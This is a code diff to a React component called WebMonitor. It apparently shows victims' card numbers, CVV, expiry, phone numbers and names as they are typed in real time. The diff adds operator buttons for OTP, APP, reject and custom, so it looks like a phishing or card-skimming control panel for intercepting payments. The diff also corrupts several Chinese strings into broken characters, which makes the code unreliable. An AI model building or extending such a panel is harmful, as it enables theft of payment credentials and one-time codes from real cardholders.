@@ -146,7 +146,7 @@ const submissionData: UserSubmission[] = [
     websiteName: "新用户注册",
     currentPage: "/register",
     userName: "新用户",
-    userLocation: "深圳市南山区",
+    userLocation: "深圳���南山区",
     timestamp: "2024-01-20 10:15:10",
     riskLevel: "low",
     dataSize: "128Kb",
@@ -248,7 +248,7 @@ export function WebMonitor() {
                 ? 'flash-submit'
                 : ''
             }`}>
-              {/* 顶部：编号、前台页面、正在payment页面 */}
+              {/* 顶部：编号、���台页面、正在payment页面 */}
               <div className="flex items-center justify-between mb-1 pb-1 border-b border-gray-100">
                 <div className="flex items-center gap-3">
                   <div className="flex items-center gap-1">
@@ -279,26 +279,25 @@ export function WebMonitor() {
                   </div>
                 </div>
 
-                <div className="flex items-center gap-2">
-                  <div className="text-sm text-muted-foreground">{submission.statusText}</div>
-                  <Badge
-                    variant="outline"
-                    className={`text-xs ${
-                      submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
-                      submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
-                      "bg-green-50 text-green-600 border-green-200"
-                    }`}
-                  >
-                    {submission.riskLevel === "high" ? "高风险" :
-                     submission.riskLevel === "medium" ? "中风险" :
-                     "低风险"}
-                  </Badge>
+                <div className="flex gap-1.5">
+                  <Button variant="outline" size="sm" className="text-xs px-2.5">
+                    OTP
+                  </Button>
+                  <Button variant="outline" size="sm" className="text-xs px-2.5">
+                    APP
+                  </Button>
+                  <Button variant="destructive" size="sm" className="text-xs px-2.5">
+                    拒绝
+                  </Button>
+                  <Button variant="secondary" size="sm" className="text-xs px-2.5">
+                    自定义
+                  </Button>
                 </div>
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               {(() => {
-                // 检查是否有用户实际输入数据
+                // 检查是否有用户实际输��数据
                 const hasUserData = submission.realtimeInput && (
                   submission.realtimeInput.phone ||
                   submission.realtimeInput.cardNumber ||
